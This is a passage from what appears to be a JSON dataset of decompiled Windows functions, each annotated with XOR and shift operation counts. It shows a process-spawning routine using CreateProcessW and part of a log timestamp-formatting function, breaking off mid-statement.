+ 1;\n  *(__m128i *)v324.m256i_i8 = _mm_loadu_si128((const __m128i *)&v334.m256i_u64[1]);\n  lpCurrentDirectory = (LPCWSTR)v157;\nLABEL_436:\n  penv = (LPWCH)v156;\n  *(__m128i *)&v332.m256i_u64[1] = _mm_load_si128((const __m128i *)&v324);\n  v322 = v157;\n  v332.m256i_i64[0] = v157;\n  ProcessInformation = 0i64;\n  *(_QWORD *)&ProcessInformation_16 = 0i64;\n  AcquireSRWLockExclusive(&stru_140084BD8);\n  LODWORD(Src) = lpDesktop;\n  v327 = (LPVOID)v152;\n  if ( 2 * qword_140084C50 )\n    v228 = !sub_14005DE50();\n  else\n    v228 = 0;\n  LOBYTE(v341) = byte_140084BE0;\n  v324.m256i_i64[1] = (__int64)&stru_140084BD8;\n  v229 = v228;\n  v324.m256i_i8[16] = v228;\n  v324.m256i_i64[0] = byte_140084BE0 != 0;\n  v334.m256i_i64[0] = 0i64;\n  v334.m256i_i64[2] = 0i64;\n  v230 = v138 + 16;\n  v231 = *((_QWORD *)v138 + 2);\n  if ( v231 == 5 )\n    v230 = 0i64;\n  v335[0] = 0i64;\n  v232 = v138 + 32;\n  v233 = *((_QWORD *)v138 + 4);\n  if ( v233 == 5 )\n    v232 = 0i64;\n  v234 = 1i64;\n  if ( *(_QWORD *)v138 != 5i64 )\n    v234 = *(_QWORD *)v138;\n  if ( !sub_1400420B0(v234, *((void **)v138 + 1), 0xFFFFFFF6, (__int64)&v334) )\n  {\n    v333 = v235;\n    v238 = 2i64;\n    if ( v231 != 5 )\n    {\n      v238 = v231;\n      v235 = (void *)*((_QWORD *)v230 + 1);\n    }\n    v239 = sub_1400420B0(v238, v235, 0xFFFFFFF5, (__int64)&v334.m256i_i64[2]);\n    lpEnvironment = v327;\n    if ( v239 )\n    {\n      v242 = v328;\n      *(_QWORD *)v328 = v240;\n      *(_QWORD *)(v242 + 16) = 2i64;\n      v156 = (__int64)penv;\n      v237 = v229;\n      v243 = v333;\n    }\n    else\n    {\n      hObject = v240;\n      v246 = 2i64;\n      if ( v233 != 5 )\n      {\n        v246 = v233;\n        v240 = (void *)*((_QWORD *)v232 + 1);\n      }\n      v247 = sub_1400420B0(v246, v240, 0xFFFFFFF4, (__int64)v335);\n      v249 = v248;\n      v237 = v229;\n      if ( v247 )\n      {\n        v250 = v328;\n        *(_QWORD *)v328 = v248;\n        *(_QWORD *)(v250 + 16) = 2i64;\n        v156 = (__int64)penv;\n        v243 = v333;\n        v251 = hObject;\n      }\n      else\n      {\n        memset(&lpString1.lpReserved, 0, 60);\n        memset(&lpString1.lpReserved2, 0, 32);\n        lpString1.cb = 104;\n        v243 = v333;\n        v251 = hObject;\n        if ( v248 || hObject || v333 )\n        {\n          lpString1.dwFlags = 256;\n          lpString1.hStdInput = v333;\n          lpString1.hStdOutput = hObject;\n          lpString1.hStdError = v248;\n        }\n        v282 = (WCHAR *)lpApplicationName[0];\n        dwCreationFlags = v150;\n        v283 = lpCommandLine[0];\n        if ( CreateProcessW(\n               lpApplicationName[0],\n               lpCommandLine[0],\n               0i64,\n               0i64,\n               1,\n               dwCreationFlags,\n               lpEnvironment,\n               lpCurrentDirectory,\n               &lpString1,\n               (LPPROCESS_INFORMATION)&ProcessInformation) )\n        {\n          v284 = *(_OWORD *)v334.m256i_i8;\n          v285 = *(_OWORD *)&v334.m256i_u64[2];\n          v286 = v328;\n          *(_OWORD *)(v328 + 48) = *(_OWORD *)v335;\n          *(_OWORD *)(v286 + 32) = v285;\n          *(_OWORD *)(v286 + 16) = v284;\n          *(__m128i *)v286 = ProcessInformation;\n          CloseHandle(v249);\n          CloseHandle(v251);\n          CloseHandle(v243);\n          sub_140042BA0((__int64)&v324);\n          v287 = penv;\n          if ( v332.m256i_i64[1] )\n            sub_140006340((void *)v322, 2ui64);\n          v288 = (unsigned __int8)Src;\n          if ( v319.m256i_i64[1] )\n            sub_140006340(v287, 2ui64);\n          if ( lpCommandLine[1] )\n            sub_140006340(v283, 2ui64);\n          if ( lpApplicationName[1] )\n            sub_140006340(v282, 2ui64);\n          if ( !((*((_QWORD *)&v314 + 1) == 0i64) | v288) )\n            sub_140006340((void *)v314, 2ui64);\n          return;\n        }\n        LODWORD(v303) = GetLastError();\n        v304 = v328;\n        *(_QWORD *)v328 = (v303 << 32) | 2;\n        *(_QWORD *)(v304 + 16) = 2i64;\n        CloseHandle(v249);\n        v156 = (__int64)penv;\n      }\n      CloseHandle(v251);\n    }\n    CloseHandle(v243);\n    goto LABEL_465;\n  }\n  v236 = v328;\n  *(_QWORD *)v328 = v235;\n  *(_QWORD *)(v236 + 16) = 2i64;\n  v156 = (__int64)penv;\n  v237 = v229;\nLABEL_465:\n  if ( v334.m256i_i64[0] )\n    CloseHandle((HANDLE)v334.m256i_i64[1]);\n  if ( v334.m256i_i64[2] )\n    CloseHandle((HANDLE)v334.m256i_i64[3]);\n  if ( v335[0] )\n    CloseHandle(v335[1]);\n  LOBYTE(lpDesktop) = (_BYTE)Src;\n  if ( !v237 && 2 * qword_140084C50 && !sub_14005DE50() )\n    byte_140084BE0 = 1;\n  ReleaseSRWLockExclusive(&stru_140084BD8);\n  if ( v332.m256i_i64[1] )\n    sub_140006340((void *)v322, 2ui64);\nLABEL_475:\n  if ( v319.m256i_i64[1] )\n    sub_140006340((void *)v156, 2ui64);\nLABEL_477:\n  if ( lpCommandLine[1] )\n    sub_140006340(lpCommandLine[0], 2ui64);\n  if ( lpApplicationName[1] )\n    sub_140006340((void *)lpApplicationName[0], 2ui64);\n  v155 = 1;\n  if ( !(_BYTE)lpDesktop )\n  {\nLABEL_252:\n    if ( *((_QWORD *)&v314 + 1) )\n      sub_140006340((void *)v314, 2ui64);\n    if ( (v311 == 0) | (unsigned __int8)v155 )\n      return;\nLABEL_133:\n    if ( v312.m128i_i64[0] )\n    {\n      v94 = v313;\n      lpString1.lpReserved = 0i64;\n      *(__m128i *)&lpString1.lpDesktop = v312;\n      *(_QWORD *)&lpString1.dwXSize = 0i64;\n      *(__m128i *)&lpString1.dwXCountChars = v312;\n      v95 = 1i64;\n    }\n    else\n    {\n      v95 = 0i64;\n      v94 = 0i64;\n    }\n    *(_QWORD *)&lpString1.cb = v95;\n    *(_QWORD *)&lpString1.dwX = v95;\n    *(_QWORD *)&lpString1.wShowWindow = v94;\n    sub_140041FF0(&lpString1);\n  }\n}\n// 14003CF30: control flows out of bounds to 14003CF37\n// 14003C08B: variable 'v113' is possibly undefined\n// 14003C19B: variable 'lpDesktop' is possibly undefined\n// 14003C25D: variable 'v123' is possibly undefined\n// 14003D0FF: variable 'v212' is possibly undefined\n// 14003D36F: variable 'v223' is possibly undefined\n// 14003D777: variable 'v235' is possibly undefined\n// 14003D7DB: variable 'v240' is possibly undefined\n// 14003D8F4: variable 'v248' is possibly undefined\n// 14003E32A: variable 'v303' is possibly undefined\n// 14003E35E: variable 'v305' is possibly undefined\n// 14003E518: variable 'v306' is possibly undefined\n// 140068AF0: using guessed type char *off_140068AF0;\n// 140068B80: using guessed type char *off_140068B80;\n// 140069308: using guessed type void *off_140069308;\n// 140069640: using guessed type char *off_140069640;\n// 14006B1E0: using guessed type void *off_14006B1E0;\n// 14006B3A0: using guessed type char *off_14006B3A0;\n// 14006B3B8: using guessed type char *off_14006B3B8;\n// 14006B3D0: using guessed type char *off_14006B3D0;\n// 14006B410: using guessed type char *off_14006B410;\n// 14006B420: using guessed type char *off_14006B420;\n// 14006B5E0: using guessed type char *off_14006B5E0;\n// 14006B618: using guessed type char *off_14006B618;\n// 14006B650: using guessed type char *off_14006B650;\n// 14006B688: using guessed type char *off_14006B688;\n// 14006B6B8: using guessed type void *off_14006B6B8;\n// 14006BC38: using guessed type char *off_14006BC38;\n// 14006BC50: using guessed type char *off_14006BC50;\n// 140084BE0: using guessed type char byte_140084BE0;\n// 140084C50: using guessed type __int64 qword_140084C50;\n\n"
    },
    {
        "Function": "sub_1400283DC",
        "Total XOR and shift operations": 17,
        "XOR operations": 0,
        "Shift operations": 17,
        "Operation percentage": "1.48%",
        "Function Body": "\nvoid __fastcall sub_1400283DC(__int64 a1, _QWORD *a2)\n{\n  __int64 v2; // rbx\n  void *v5; // r13\n  size_t v6; // r12\n  __int64 v7; // rax\n  __int64 v8; // rdx\n  __int64 v9; // rsi\n  __int64 v10; // rdi\n  const void *v11; // r8\n  size_t v12; // r9\n  __int64 v13; // rax\n  __int64 v14; // rdx\n  __int64 v15; // rsi\n  __int64 v16; // rdi\n  const void *v17; // r8\n  size_t v18; // r9\n  __int64 v19; // rbp\n  char v20; // dl\n  char v21; // r15\n  _QWORD *v22; // rdi\n  unsigned __int64 v23; // rsi\n  __int64 v24; // rdx\n  __int64 v25; // rcx\n  unsigned __int64 v26; // rsi\n  int v27; // r15d\n  unsigned __int64 v28; // rax\n  unsigned __int64 v29; // r8\n  unsigned __int64 v30; // rbx\n  unsigned __int64 v31; // rbp\n  unsigned __int64 v32; // rsi\n  unsigned __int8 v33; // bl\n  unsigned __int8 v34; // bp\n  char v35; // si\n  unsigned __int64 v36; // rdi\n  __int64 v37; // rdx\n  __int64 v38; // rax\n  int v39; // esi\n  __int64 v40; // rbx\n  int v41; // edi\n  int v42; // ebp\n  __int64 v43; // rdx\n  __int64 v44; // rdx\n  int v45; // ebp\n  __int64 v46; // rbx\n  __int64 v47; // rbx\n  unsigned __int8 v48; // al\n  unsigned __int8 v49; // dl\n  unsigned __int8 v50; // si\n  __int64 v51; // rbx\n  __int64 v52; // rbx\n  __int64 v53; // r15\n  __int64 v54; // rdi\n  __int64 v55; // rdi\n  __int64 v56; // r15\n  __int64 v57; // r15\n  int v58; // ebp\n  __int64 v59; // rbx\n  int v60; // esi\n  int v61; // r15d\n  __int64 v62; // rdx\n  __int64 v63; // rdx\n  char v64; // al\n  unsigned __int8 v65; // dl\n  unsigned __int8 v66; // bl\n  __int64 v67; // rax\n  unsigned __int8 *v68; // rsi\n  __int64 v69; // rax\n  __int64 v70; // rcx\n  __int128 *v71; // rdx\n  char v72; // bl\n  char *v73; // rax\n  __int64 v74; // rcx\n  __int64 v75; // rax\n  __int64 v76; // rdi\n  __int64 v77; // rax\n  __int64 v78; // rax\n  __int64 v79; // rbp\n  __int64 v80; // rdi\n  __int64 v81; // rbx\n  __int64 v82; // rdi\n  __int64 v83; // rax\n  unsigned __int8 *v84; // rbx\n  __int64 v85; // rbp\n  __int64 v86; // rbx\n  __int64 v87; // r15\n  __int64 v88; // rdi\n  unsigned __int8 *v89; // r15\n  unsigned __int8 *v90; // r8\n  char **v91; // rax\n  __int128 *v92; // rdx\n  __int64 v93; // rax\n  __int128 *v94; // rdx\n  const char *v95; // rax\n  bool v96; // zf\n  const char *v97; // rcx\n  __int64 v98; // rax\n  char **v99; // rax\n  _BYTE *v100; // rsi\n  char v101; // dl\n  char v102; // bp\n  char *v103; // r15\n  char v104; // al\n  __int64 v105; // rdx\n  char v106; // al\n  __int64 v107; // rdx\n  __int64 v108; // rsi\n  __int64 v109; // rdi\n  __int64 v110; // rdx\n  char v111; // bp\n  __int64 v112; // rcx\n  char v113; // dl\n  unsigned __int8 *v114; // r15\n  __int64 v115; // rdi\n  __int64 v116; // rbx\n  unsigned int v117; // esi\n  __int64 v118; // rdi\n  __int64 v119; // rbp\n  char v120; // [rsp+3Fh] [rbp-179h]\n  char v121; // [rsp+3Fh] [rbp-179h]\n  __int64 v122; // [rsp+40h] [rbp-178h]\n  __int64 v123; // [rsp+40h] [rbp-178h]\n  unsigned __int64 v124; // [rsp+48h] [rbp-170h]\n  _QWORD *v125; // [rsp+48h] [rbp-170h]\n  __int128 v126; // [rsp+50h] [rbp-168h] BYREF\n  __int64 v127; // [rsp+60h] [rbp-158h]\n  void (__fastcall __noreturn *v128)(); // [rsp+68h] [rbp-150h]\n  __int64 v129; // [rsp+78h] [rbp-140h]\n  __int128 v130; // [rsp+80h] [rbp-138h] BYREF\n  __int64 v131; // [rsp+90h] [rbp-128h]\n  __int128 v132; // [rsp+98h] [rbp-120h]\n  __int64 v133; // [rsp+A8h] [rbp-110h]\n  char v134; // [rsp+B0h] [rbp-108h]\n  unsigned int v135; // [rsp+BCh] [rbp-FCh]\n  _BYTE v136[12]; // [rsp+C0h] [rbp-F8h] BYREF\n  unsigned __int16 v137; // [rsp+CCh] [rbp-ECh]\n  unsigned __int8 v138; // [rsp+CEh] [rbp-EAh]\n  __int64 v139; // [rsp+D0h] [rbp-E8h]\n  __int64 v140; // [rsp+D8h] [rbp-E0h]\n  __int64 v141; // [rsp+E0h] [rbp-D8h]\n  unsigned __int64 v142; // [rsp+E8h] [rbp-D0h]\n  __int128 *v143; // [rsp+F0h] [rbp-C8h] BYREF\n  size_t v144; // [rsp+F8h] [rbp-C0h]\n  unsigned __int8 *v145; // [rsp+100h] [rbp-B8h]\n  __int64 v146; // [rsp+108h] [rbp-B0h]\n  __int64 v147; // [rsp+110h] [rbp-A8h]\n  __int64 v148; // [rsp+118h] [rbp-A0h]\n  __int128 v149; // [rsp+120h] [rbp-98h] BYREF\n  __int64 *v150; // [rsp+130h] [rbp-88h]\n  __int64 v151; // [rsp+138h] [rbp-80h]\n  __int128 *v152; // [rsp+140h] [rbp-78h]\n  __int64 v153; // [rsp+148h] [rbp-70h]\n  _QWORD *v154; // [rsp+158h] [rbp-60h]\n  char *v155; // [rsp+160h] [rbp-58h] BYREF\n  __int64 v156; // [rsp+168h] [rbp-50h]\n  __int64 v157; // [rsp+170h] [rbp-48h]\n\n  if ( a2[6] > *(_QWORD *)(a1 + 176) )\n  {\n    v2 = 0i64;\n    goto LABEL_172;\n  }\n  v142 = a2[6];\n  v5 = (void *)a2[7];\n  v6 = a2[8];\n  v7 = sub_140027502((__int64 *)(a1 + 120));\n  if ( !v8 )\n  {\nLABEL_9:\n    v13 = sub_140027502((__int64 *)(a1 + 144));\n    if ( v14 )\n    {\n      v15 = v13;\n      v16 = 24 * v14;\n      v2 = 0i64;\n      while ( v16 )\n      {\n        v17 = *(const void **)v15;\n        if ( !*(_QWORD *)v15 )\n          v17 = *(const void **)(v15 + 8);\n        v18 = *(_QWORD *)(v15 + 16);\n        v15 += 24i64;\n        v16 -= 24i64;\n        if ( sub_14004B537(v5, v6, v17, v18) )\n          goto LABEL_172;\n      }\n    }\n    v154 = a2;\n    sub_140027494((__int64)&v130, a1 + 184);\n    v19 = sub_140029FB5((__int64)&v130, (__int64)&off_1400689E8);\n    v21 = v20;\n    v22 = (_QWORD *)(v19 + 96);\n    v23 = v142;\n    v24 = 96i64;\n    if ( v142 == 1 )\n    {\n      v24 = 16i64;\n      v22 = (_QWORD *)(v19 + 16);\n    }\n    v25 = *(unsigned int *)(a1 + 4 * v142 + 96);\n    if ( *(_QWORD *)(a1 + 56) - 1i64 >= v142 )\n      goto LABEL_63;\n    v135 = *(_DWORD *)(a1 + 4 * v142 + 96);\n    v146 = v24;\n    v124 = (unsigned __int64)v22;\n    *(_QWORD *)&v130 = 0i64;\n    off_140084050(&v130);\n    v122 = v19;\n    v120 = v21;\n    if ( (__int64)v130 >= 116444736000000000i64 )\n    {\n      v26 = v130 - 116444736000000000i64;\n      sub_14004E0AE((__int64)&v130, ((__int64)v130 - 116444736000000000i64) / 0xC92A69C000ui64 + 2440588);\n      v27 = sub_14004E3B2((unsigned int *)&v130, (__int64)&unk_14006CE00, 32i64, (__int64)&off_14006CE20);\n      v28 = ((v26 / 0x861C46800i64 % 0x18) << 48) | ((v26 / 0x23C34600 % 0x3C) << 40) | ((v26 / 0x989680 % 0x3C) << 32) | (100 * (v26 % 0x989680));\n      WORD6(v130) = 0;\n      BYTE14(v130) = 0;\n      goto LABEL_33;\n    }\n    v29 = (116444736000000000i64 - (__int64)v130) % 0x989680ui64;\n    v30 = (116444736000000000i64 - (__int64)v130) / 0x989680ui64 % 0x3C;\n    v31 = (116444736000000000i64 - (__int64)v130) / 0x23C34600ui64 % 0x3C;\n    v32 = (116444736000000000i64 - (__int64)v130) / 0x861C46800ui64 % 0x18;\n    if ( (_DWORD)v29 )\n    {\n      v129 = (unsigned int)(-100 * v29 + 1000000000);\n      v33 = ~(_BYTE)v30;\n    }\n    else\n    {\n      v129 = 0i64;\n      v33 = -(char)v30;\n      if ( !v33 )\n      {\n        v129 = 0i64;\n        v34 = -(char)v31;\n        if ( !v34 )\n        {\n          v129 = 0i64;\n          v35 = -(char)v32;\n          if ( !v35 )\n          {\n            v36 = 0i64;\n            goto LABEL_27;\n          }\nLABEL_26:\n          v36 = (unsigned __int64)(unsigned __int8)(v35 + 24) << 48;\nLABEL_27:\n          sub_14004E0AE((__int64)&v130, 2440588 - (116444736000000000i64 - (__int64)v130) / 0xC92A69C000ui64);\n          v27 = sub_14004E3B2(\n                  (unsigned int *)&v130,\n                  (__int64)\"overflow subtracting duration from date\",\n                  39i64,\n                  (__int64)&off_14006CE60);\n          if ( v35 < 0 )\n          {\n            if ( (v27 & 0x1FF) == 1 )\n            {\n              if ( v27 == -5119487 )\n                sub_14005D1D0((__int64)\"resulting value is out of range\", 31i64, (__int64)&off_14006CD28);\n              v27 = (unsigned __int16)sub_14004E546((v27 >> 9) - 1) | (((v27 >> 9) - 1) << 9);\n            }\n            else\n            {\n              --v27;\n            }\n          }\n          v28 = ((unsigned __int64)v34 << 40) | v36 | ((unsigned __int64)v33 << 32) | (unsigned int)v129;\n          BYTE14(v130) = 0;\n          WORD6(v130) = 0;\n          v19 = v122;\nLABEL_33:\n          LODWORD(v130) = v27;\n          *(_QWORD *)((char *)&v130 + 4) = v28;\n          sub_14004DA36(\n            (__int64)v136,\n            (__int64)&v130,\n            *(unsigned __int16 *)(a1 + 171) | (*(unsigned __int8 *)(a1 + 173) << 16));\n          v38 = *(_QWORD *)(a1 + 32);\n          v22 = (_QWORD *)v124;\n          if ( v38 )\n          {\n            v21 = v120;\n            if ( (_DWORD)v38 != 1 )\n            {\n              sub_14002AE80(\n                &v126,\n                *(_QWORD *)(a1 + 40),\n                *(_QWORD *)(a1 + 48),\n                v124,\n                *(int *)v136,\n                *(unsigned __int64 *)&v136[4],\n                (v138 << 24) + (v137 << 8) + 1);\n              if ( (_QWORD)v126 == 2i64 )\n                goto LABEL_68;\n              if ( (_DWORD)v126 == 3 )\n              {\nLABEL_61:\n                *(_QWORD *)&v130 = &off_1400687A0;\n                *((_QWORD *)&v130 + 1) = 1i64;\n                v131 = (__int64)&off_14006CC28;\n                v132 = 0i64;\n                v2 = sub_140026A05((__int64)v22, &v130);\n                v23 = v142;\n                if ( v2 )\n                  goto LABEL_171;\n                v24 = v146;\n                v25 = v135;\nLABEL_63:\n                if ( *(_QWORD *)(a1 + 64) - 1i64 >= v23 )\n                {\nLABEL_85:\n                  if ( *(_QWORD *)(a1 + 72) - 1i64 >= v23 )\n                    goto LABEL_129;\n                  v72 = *(_BYTE *)(a1 + 170);\n                  if ( v72 )\n                  {\n                    v73 = sub_14002E590(v25, v24);\n                    v155 = v73;\n                    v74 = *((_QWORD *)v73 + 3);\n                    if ( !v74 )\n                    {\n                      if ( v72 != 2 )\n                      {\nLABEL_128:\n                        sub_140027E61((__int64 *)&v155);\n                        goto LABEL_129;\n                      }\n                      v77 = sub_140027B78((__int64)v22, *(_QWORD *)a1, *(_QWORD *)(a1 + 8));\nLABEL_126:\n                      v2 = v77;\n                      if ( v77 )\n                      {\n                        sub_140027E61((__int64 *)&v155);\n                        goto LABEL_171;\n                      }\n                      goto LABEL_128;\n                    }\n                    v75 = *((_QWORD *)v73 + 4) - 1i64;\n                    v143 = (__int128 *)v74;\n                    v144 = v75;\n                    if ( *(_QWORD *)a1 )\n                    {\n                      if ( (unsigned int)*(_QWORD *)a1 != 1 )\n                      {\n                        *(_QWORD *)&v149 = &v143;\n                        v92 = &v130;\n                        *(_QWORD *)&v130 = &off_1400684E8;\n                        *((_QWORD *)&v130 + 1) = 2i64;\n                        *((_QWORD *)&v149 + 1) = sub_140022230;\n                        v131 = (__int64)&v149;\n                        v132 = 1ui64;\n                        goto LABEL_125;\n                      }\n                      *(_QWORD *)v136 = *(_QWORD *)(a1 + 8);\n                      *(_QWORD *)&v126 = &v143;\n                      *((_QWORD *)&v126 + 1) = sub_140022230;\n                      v127 = (__int64)v136;\n                      *(_QWORD *)&v130 = 2i64;\n                      v131 = 1i64;\n                      v132 = 1ui64;\n                      v128 = sub_1400072C0;\n                      v133 = 32i64;\n                      v134 = 0;\n                    }\n                    else\n                    {\n                      *(_QWORD *)v136 = *(_QWORD *)(a1 + 8);\n                      *(_QWORD *)&v126 = &v143;\n                      *((_QWORD *)&v126 + 1) = sub_140022230;\n                      v127 = (__int64)v136;\n                      *(_QWORD *)&v130 = 2i64;\n                      v131 = 1i64;\n                      v132 = 1ui64;\n                      v128 = sub_1400072C0;\n                      v133 = 32i64;\n                      v134 = 1;\n                    }\n                    v92 = &v149;\n                    *(_QWORD *)&v149 = &off_1400684E8;\n                    *((_QWORD *)&v149 + 1) = 2i64;\n                    v152 = &v130;\n                    v153 = 1i64;\n                    v150 = (__int64 *)&v126;\n                    v151 = 2i64;\nLABEL_125:\n                    v77 = sub_140026A05((__int64)v22, v92);\n                    goto LABEL_126;\n                  }\n                  v2 = sub_140027B78((__int64)v22, *(_QWORD *)a1, *(_QWORD *)(a1 + 8));\n                  if ( !v2 )\n                  {\nLABEL_129:\n                    if ( *(_QWORD *)(a1 + 80) - 1i64 >= v23 )\n                      goto LABEL_137;\n                    v93 = *(_QWORD *)(a1 + 16);\n                    if ( v93 )\n                    {\n                      if ( (_DWORD)v93 != 1 )\n                      {\n                        *(_QWORD *)&v149 = v5;\n                        *((_QWORD *)&v149 + 1) = v6;\n                        *(_QWORD *)&v126 = &v149;\n                        v94 = &v130;\n                        *(_QWORD *)&v130 = &off_14006ADA8;\n                        *((_QWORD *)&v130 + 1) = 2i64;\n                        *((_QWORD *)&v126 + 1) = sub_140022230;\n                        v131 = (__int64)&v126;\n                        v132 = 1ui64;\nLABEL_136:\n                        v2 = sub_140026A05((__int64)v22, v94);\n                        if ( v2 )\n                          goto LABEL_171;\nLABEL_137:\n                        if ( *(_QWORD *)(a1 + 88) - 1i64 >= v23 )\n                          goto LABEL_149;\n                        if ( v154[3] == 2i64 )\n                          v95 = 0i64;\n                        else\n                          v95 = (const char *)v154[4];\n                        v96 = v95 == 0i64;\n                        v97 = \"<unknown>\";\n                        if ( v95 )\n                          v97 = v95;\n                        v98 = 9i64;\n                        if ( !v96 )\n                          v98 = v154[5];\n                        *(_QWORD *)&v126 = v97;\n                        *((_QWORD *)&v126 + 1) = v98;\n                        if ( *((_DWORD *)v154 + 18) )\n                        {\n                          LODWORD(v143) = *((_DWORD *)v154 + 19);\n                          *(_QWORD *)&v149 = &v126;\n                          *((_QWORD *)&v149 + 1) = sub_140022230;\n                          v150 = (__int64 *)&v143;\n                          *(_QWORD *)&v130 = &off_1400688D8;\n                          *((_QWORD *)&v130 + 1) = 3i64;\n                          v151 = (__int64)sub_140008C20;\n                          v131 = (__int64)&v149;\n                          v132 = 2ui64;\n                        }\n                        else\n                        {\n                          *(_QWORD *)&v149 = &v126;\n                          *(_QWORD *)&v130 = &off_1400688B0;\n                          *((_QWORD *)&v130 + 1) = 2i64;\n                          *((_QWORD *)&v149 + 1) = sub_140022230;\n                          v131 = (__int64)&v149;\n                          v132 = 1ui64;\n                        }\n                        v2 = sub_140026A05((__int64)v22, &v130);\n                        if ( !v2 )\n                        {\nLABEL_149:\n                          *(_QWORD *)&v126 = v154 + 10;\n                          *(_QWORD *)&v149 = &v126;\n                          *(_QWORD *)&v130 = &off_140068908;\n                          *((_QWORD *)&v130 + 1) = 2i64;\n                          *((_QWORD *)&v149 + 1) = sub_140027653;\n                          v131 = (__int64)&v149;\n                          v132 = 1ui64;\n                          v2 = sub_140026A05((__int64)v22, &v130);\n                          if ( !v2 )\n                            v2 = (__int64)sub_1400273B8(v22);\n                        }\n                        goto LABEL_171;\n                      }\n                      *(_QWORD *)v136 = *(_QWORD *)(a1 + 24);\n                      v143 = (__int128 *)v5;\n                      v144 = v6;\n                      *(_QWORD *)&v126 = &v143;\n                      *((_QWORD *)&v126 + 1) = sub_140022230;\n                      v127 = (__int64)v136;\n                      *(_QWORD *)&v130 = 2i64;\n                      v131 = 1i64;\n                      v132 = 1ui64;\n                      v128 = sub_1400072C0;\n                      v133 = 32i64;\n                      v134 = 0;\n                    }\n                    else\n                    {\n                      *(_QWORD *)v136 = *(_QWORD *)(a1 + 24);\n                      v143 = (__int128 *)v5;\n                      v144 = v6;\n                      *(_QWORD *)&v126 = &v143;\n                      *((_QWORD *)&v126 + 1) = sub_140022230;\n                      v127 = (__int64)v136;\n                      *(_QWORD *)&v130 = 2i64;\n                      v131 = 1i64;\n                      v132 = 1ui64;\n                      v128 = sub_1400072C0;\n                      v133 = 32i64;\n                      v134 = 1;\n                    }\n                    v94 = &v149;\n                    *(_QWORD *)&v149 = &off_14006ADA8;\n                    *((_QWORD *)&v149 + 1) = 2i64;\n                    v152 = &v130;\n                    v153 = 1i64;\n                    v150 = (__int64 *)&v126;\n                    v151 = 2i64;\n                    goto LABEL_136;\n                  }\nLABEL_171:\n                  sub_14004CA6E(v19, v21);\n                  goto LABEL_172;\n                }\n                v96 = *(_BYTE *)(a1 + 168) == 0;\n                v146 = v24;\n                if ( v96 )\n                {\n                  BYTE10(v149) = 11;\n                  LODWORD(v149) = 0;\n                  WORD2(v149) = 256;\n                  v135 = v25;\n                  *(_DWORD *)((char *)&v149 + 6) = v25;\n                  v69 = *(_QWORD *)(v19 + v24);\n                  if ( (*(_DWORD *)(v19 + v24) & 0xFFFFFFFE) != 4 )\n                  {\n                    v2 = (__int64)sub_1400273B8(v22);\n                    if ( v2 )\n                      goto LABEL_171;\n                    v69 = *(_QWORD *)(v19 + v146);\n                  }\n                  v70 = 2i64;\n                  if ( (unsigned __int64)(v69 - 4) < 2 )\n                    v70 = v69 - 4;\n                  if ( v70 )\n                  {\n                    if ( v70 != 1 )\n                    {\n                      switch ( v69 )\n                      {\n                        case 0i64:\n                          v91 = sub_140038380(v22 + 1);\n                          goto LABEL_156;\n                        case 1i64:\n                          sub_140038BF0(v22 + 1);\n                          goto LABEL_157;\n                        case 2i64:\n                          v91 = sub_140028347(v22 + 1);\n                          goto LABEL_156;\n                        case 3i64:\n                          v91 = sub_14002836C(v22 + 1);\nLABEL_156:\n                          v2 = (__int64)v91;\n                          if ( v91 )\n                            goto LABEL_171;\nLABEL_157:\n                          v121 = v21;\n                          v123 = v19;\n                          sub_140027494((__int64)&v130, (__int64)(v22 + 6));\n                          v100 = (_BYTE *)sub_140026A96((__int64)&v130, (__int64)&off_140068238);\n                          v102 = v101;\n                          v103 = v100 + 9;\n                          if ( (_BYTE)v135 == 11\n                            || (v104 = sub_14004B338(v135, 0), v104 == 2)\n                            || (v100[16] = v105, v100[14] = v104 & 1, (v2 = sub_14004EA51(v103, v105)) == 0) )\n                          {\n                            v2 = 0i64;\n                            if ( BYTE10(v149) != 11 )\n                            {\n                              v106 = sub_14004B338(*(unsigned int *)((char *)&v149 + 10), 0);\n                              if ( v106 != 2 )\n                              {\n                                v100[17] = v107;\n                                v100[15] = v106 & 1;\n                                v2 = sub_14004EA51(v103, v107);\n                              }\n                            }\n                          }\n                          sub_14004CA6E((__int64)v100, v102);\n                          v19 = v123;\n                          v21 = v121;\n                          if ( !v2 )\n                            goto LABEL_164;\n                          goto LABEL_171;\n                      }\n                    }\n                    v2 = (__int64)sub_140026A84(v22 + 1);\n                    if ( v2 )\n                      goto LABEL_171;\n                    if ( (_BYTE)v135 != 11 )\n                    {\n                      v2 = (__int64)sub_140026AE0(v22 + 1, 1, (_BYTE *)&v149 + 6, 0);\n                      if ( v2 )\n                        goto LABEL_171;\n                    }\n                  }\nLABEL_164:\n                  v23 = v142;\n                }\n                if ( *(_BYTE *)(a1 + 169) )\n                {\n                  if ( *(_BYTE *)(a1 + 169) != 1 )\n                  {\n                    v143 = (__int128 *)v23;\n                    v71 = &v130;\n                    *(_QWORD *)&v130 = &off_140068860;\n                    *((_QWORD *)&v130 + 1) = 2i64;\n                    *(_QWORD *)&v149 = &v143;\n                    *((_QWORD *)&v149 + 1) = sub_14000E7A3;\n                    v131 = (__int64)&v149;\n                    v132 = 1ui64;\n                    goto LABEL_83;\n                  }\n                  *(_QWORD *)v136 = v23;\n                  v143 = (__int128 *)v136;\n                  *(_QWORD *)&v130 = 2i64;\n                  v131 = 0i64;\n                  v132 = 5ui64;\n                  v144 = (size_t)sub_14000E7A3;\n                  v133 = 32i64;\n                  v134 = 0;\n                }\n                else\n                {\n                  *(_QWORD *)v136 = v23;\n                  v143 = (__int128 *)v136;\n                  *(_QWORD *)&v130 = 2i64;\n                  v131 = 0i64;\n                  v132 = 5ui64;\n                  v144 = (size_t)sub_14000E7A3;\n                  v133 = 32i64;\n                  v134 = 1;\n                }\n                v71 = &v149;\n                *(_QWORD *)&v149 = &off_140068860;\n                *((_QWORD *)&v149 + 1) = 2i64;\n                v152 = &v130;\n                v153 = 1i64;\n                v150 = (__int64 *)&v143;\n                v151 = 1i64;\nLABEL_83:\n                sub_14002A056((__int64 *)&v126, (__int64 *)v71);\n                *(_QWORD *)&v149 = &v126;\n                *(_QWORD *)&v130 = &off_140068880;\n                *((_QWORD *)&v130 + 1) = 2i64;\n                *((_QWORD *)&v149 + 1) = sub_1400013E6;\n                v131 = (__int64)&v149;\n                v132 = 1ui64;\n                v2 = sub_140026A05((__int64)v22, &v130);\n                sub_14004D22F((void *)v126, *((__int64 *)&v126 + 1));\n                v23 = v142;\n                if ( v2 )\n                  goto LABEL_171;\n                if ( !*(_BYTE *)(a1 + 168) )\n                {\n                  v78 = *(_QWORD *)(v19 + v146);\n                  v24 = 